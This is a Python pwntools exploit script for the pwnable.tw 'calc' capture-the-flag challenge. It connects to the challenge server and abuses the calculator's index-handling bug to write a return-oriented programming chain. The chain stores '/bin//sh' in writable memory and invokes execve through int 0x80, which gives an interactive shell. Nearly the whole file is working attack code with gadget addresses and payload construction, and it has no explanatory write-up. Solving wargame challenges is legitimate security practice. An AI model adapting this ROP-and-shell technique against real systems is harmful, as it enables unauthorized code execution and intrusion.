#!/usr/bin/env python
import re
from pwn import *
import pwnlib.shellcraft

c = remote('chall.pwnable.tw', 10100)
#c = process('./calc')

context.os='linux'
context.terminal = ['alacritty', '-e', 'sh', '-c']

gdbcmd = '''source /usr/share/peda/peda.py
# b *0x8049160
# telescope $edx+$eax*4+0x4-0x20 50
# p $edx+$eax*4+0x4

# b *0x080481ba
b *0x0807087f

#stack 500
'''

#gdb.attach(c, gdbcmd)
context.log_level ='debug'

def rop1():
    # 0x080481ba : ret
    nop_ret = 0x080481ba

    # find a writable zero space
    # write /bin///sh
    # telescope 0x80ed1a8 50
    bss = 0x80ed1a8

    # from pwn import *
    # print(pwnlib.shellcraft.i386.linux.sh())

    rop_chain = [
            nop_ret, # break point
            nop_ret, # break point
            # write /bin//sh to bss
            # eax = bss, edx = /bin
            0x0805c34b, # pop eax ; ret
            bss,
            0x080701aa, # pop edx ; ret
            u32(b'/bin'),
            0x0807cc01, # mov dword ptr [eax], edx ; ret

            # eax = bss + 4, edx = //sh
            0x0805c34b, # pop eax ; ret
            bss + 4,
            0x080701aa, # pop edx ; ret
            u32(b'//sh'),
            0x0807cc01, # mov dword ptr [eax], edx ; ret

            # execve args execve(/bin/sh,0,0)
            # eax = 0xb, ebx = bss, ecx = bss, edx = 0
            # set edx = 0
            0x080701aa, # pop edx ; ret
            0x1,
            0x080e72e3, # dec edx ; ret
            0x080701d1, # pop ecx ; pop ebx ; ret
            1, # ecx = 1 - 1 = 0
            bss,
            0x0806f4eb, # dec ecx ; ret

            0x0805c34b, # pop eax ; ret
            0xb,
            0x0807087f, # nop ; int 0x80
            ]

    # Reverse Order ROP
    rop_chain = rop_chain[::-1]
    rev_rop = ''
    for i in range(len(rop_chain)):
        rev_rop += '+{}+{}\n'.format(360 + len(rop_chain) - i - 1, str(rop_chain[i]))
    c.sendline(rev_rop.encode())

rop1()

c.interactive()
c.close()

